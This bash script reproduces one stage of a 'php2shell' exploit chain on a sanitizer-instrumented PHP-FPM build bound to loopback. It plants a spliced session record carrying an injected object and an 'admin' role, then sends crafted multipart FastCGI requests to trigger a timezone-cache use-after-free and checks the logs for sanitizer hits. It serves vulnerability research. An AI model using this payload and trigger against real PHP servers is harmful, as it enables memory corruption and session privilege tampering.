#!/bin/bash
# php2shell Stage A on the FPM SAPI (wake 22).
#
# Bounded question: does the SAME startup-tzcache UAF read that Stage A proved
# on CGI also fire on FPM?  If it does, "other SAPIs UNKNOWN" narrows to the
# occupant TYPE on FPM (the plain-build GDB question), not the existence of the
# corruption path.  If it does not, FPM is a NEGATIVE for this consumer.
#
# Loopback-only: php-fpm binds 127.0.0.1, driven by the committed FastCGI
# client (php2shell-fpm-client.py).  No external systems contacted.
#
# Usage: bash lab/repro/php2shell-stageA-fpm.sh <php-fpm-bin> [outdir] [port]
#   <php-fpm-bin>: lab/build/php-8.4.27-fpm-asan/sapi/fpm/php-fpm
set -u
FPM=$(readlink -f "$1")
OUT=${2:-lab/build/evidence/stageA-fpm}
PORT=${PORT:-${3:-18124}}
BUILDDIR=$(dirname "$(dirname "$(dirname "$FPM")")")
LABEL=$(basename "$BUILDDIR" | sed 's/^php-//')
CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
mkdir -p "$OUT"
LOG="$OUT/stageA-fpm-$LABEL.log"
: > "$LOG"
D=$(mktemp -d)
MPID=
cleanup() {
  if [ -n "$MPID" ]; then
    kill -TERM "$MPID" 2>/dev/null || true
    wait "$MPID" 2>/dev/null || true
  fi
  rm -rf "$D"
}
trap cleanup EXIT
SESS="$D/sess"; WWW="$D/www"; mkdir -p "$SESS" "$WWW"

# The splice-MID session record from Stage A: a long valid s:64 value that
# overruns into an embedded object whose promotion drives the decode warning.
SID=tzsplice
OBJ='evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
SPLICE_MID='data|s:64:"'$(printf 'A%.0s' {1..88})$OBJ$(printf 'B%.0s' {1..32})'";roles|a:1:{i:0;s:5:"admin";}'
printf '%s' "$SPLICE_MID" > "$SESS/sess_$SID"

printf '<?php echo "worker\n";' > "$WWW/worker.php"

# multipart body: upload-progress field (drives the pre-RINIT decode warning)
# + one file so rfc1867 runs the upload-progress write path.
BOUND=---------------------------20896060251896012921717172737
{
  printf -- '--%s\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' "$BOUND"
  printf -- '--%s\r\nContent-Disposition: form-data; name="file1"; filename="a.txt"\r\n\r\n1\r\n' "$BOUND"
  printf -- '--%s--\r\n' "$BOUND"
} > "$D/body"

# FPM config.  php_admin_value[date.timezone]=Bogus/Zone makes the INI-check
# warning at startup format a timestamp through DATEG(tzcache), which allocates
# the 56-B HashTable; the file error_log keeps that warning on disk.  The
# pre-RINIT splice warning then reads the same pointer after the free.
cat > "$D/fpm.conf" <<EOF
[global]
error_log = $D/fpm-error.log
daemonize = no
log_level = notice
process_control_timeout = 5
pid = $D/fpm.pid

[www]
listen = 127.0.0.1:$PORT
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
env[USE_ZEND_ALLOC] = 0
env[USE_TRACKED_ALLOC] = 1
php_admin_value[memory_limit] = 16M
php_admin_value[max_execution_time] = 0
php_admin_value[post_max_size] = 1M
php_admin_value[max_input_vars] = 10000
php_admin_value[html_errors] = 0
php_admin_value[display_errors] = 0
php_admin_value[log_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[error_log] = $D/php-error.log
php_admin_value[date.timezone] = Bogus/Zone
php_admin_value[session.save_path] = $SESS
php_admin_value[session.name] = PHPSESSID
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_cookies] = 1
php_admin_value[session.cache_limiter] =
php_admin_value[session.save_handler] = files
php_admin_value[session.serialize_handler] = php
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = upload_progress_
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = 1%
php_admin_value[session.upload_progress.min_freq] = 0.000000001
php_admin_value[file_uploads] = 1
php_admin_value[upload_max_filesize] = 1024
EOF
{ echo "--- fpm.conf (tmpdir $D) ---"; cat "$D/fpm.conf"; echo "--- end ---"; } >> "$LOG"

wait_port() {
python3 - "$PORT" <<'PY'
import socket, sys, time
p = int(sys.argv[1])
for _ in range(150):
    try:
        s = socket.create_connection(('127.0.0.1', p), 0.2); s.close(); sys.exit(0)
    except OSError:
        time.sleep(0.1)
sys.exit(1)
PY
}
( export USE_ZEND_ALLOC=0 USE_TRACKED_ALLOC=1 \
    ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:allocator_may_return_null=1 \
    UBSAN_OPTIONS=halt_on_error=1:print_stacktrace=1
  exec "$FPM" -n -F -y "$D/fpm.conf" \
    -d date.timezone=Bogus/Zone \
    -d error_log="$D/php-error.log" -d log_errors=1 \
    -d error_reporting=32767 -d display_errors=0 -d html_errors=0 \
    ) >> "$LOG" 2>&1 &
MPID=$!
if ! wait_port; then
  echo "FPM did not bind 127.0.0.1:$PORT" >> "$LOG"
  echo "== verdict: FPM_NOT_READY"
  exit 3
fi
echo "== FPM master pid=$MPID label=$LABEL build=$BUILDDIR $(date -u)" >> "$LOG"

fcgi() { python3 "$CLIENT" "$PORT" "$@"; }

# Baseline request first (no cookie): proves the worker serves requests and
# that the startup diagnostic emitted the tzcache-allocating warning.
echo "-- baseline --" >> "$LOG"
fcgi "$WWW/worker.php" >> "$LOG" 2>&1
echo "baseline_rc=$?" >> "$LOG"

# The Stage A request: splice record + query-string value + upload progress.
for qs in 'XXX=ABCDEFGHIJ' 'XXX=AAAAAAAAA' 'XXX=AAAAAAAA'; do
  echo "-- splice request QUERY_STRING=$qs --" >> "$LOG"
  fcgi "$WWW/worker.php" \
    --param "QUERY_STRING=$qs" \
    --param "HTTP_COOKIE=PHPSESSID=$SID" \
    --param "CONTENT_TYPE=multipart/form-data; boundary=$BOUND" \
    --body "$D/body" >> "$LOG" 2>&1
  echo "request_rc=$? qs=$qs $(date -u)" >> "$LOG"
done

# Give FPM a moment to flush worker stderr into the logs.
sleep 2

echo "== verdict scan" >> "$LOG"
SIGNALS=$(grep -hE 'AddressSanitizer|heap-use-after-free|runtime error:|zend_hash_str_find_bucket|SIGABRT|signal 6' "$LOG" "$D/fpm-error.log" "$D/php-error.log" 2>/dev/null | sort -u)
if [ -n "$SIGNALS" ]; then
  printf '%s\n' "$SIGNALS" >> "$LOG"
  echo "== verdict: UAF_SIGNAL_PRESENT" >> "$LOG"
else
  echo "== verdict: no sanitizer/UAF signal on FPM" >> "$LOG"
fi
if [ -f "$D/php-error.log" ]; then
  echo "-- php-error.log tail --" >> "$LOG"
  tail -20 "$D/php-error.log" >> "$LOG"
fi
if [ -f "$D/fpm-error.log" ]; then
  echo "-- fpm-error.log tail --" >> "$LOG"
  tail -20 "$D/fpm-error.log" >> "$LOG"
fi
cp "$D/php-error.log" "$OUT/php-error-$LABEL.log" 2>/dev/null || true
cp "$D/fpm-error.log" "$OUT/fpm-error-$LABEL.log" 2>/dev/null || true
echo "verdict FPM: $(grep '== verdict:' "$LOG" | tail -1)"
echo "logs: $LOG $D/fpm-error.log $D/php-error.log"
